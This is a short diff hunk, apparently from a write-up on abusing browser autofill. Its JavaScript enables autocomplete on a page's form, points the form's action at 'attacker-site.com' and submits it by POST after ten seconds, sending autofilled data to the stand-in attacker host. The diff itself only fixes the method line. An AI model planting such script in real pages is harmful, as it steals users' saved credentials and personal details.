@@ -20,7 +20,7 @@ The input tags are not set to autocomplete. So we will do it at first
 let form = document.forms[0];
 form.autocomplete = "on";
 form.action = "https://attacker-site.com";
-form.method = "https://attacker-site.com";
+form.method = "POST";
 setTimeout(() => {
   form.submit();
 }, 10000);
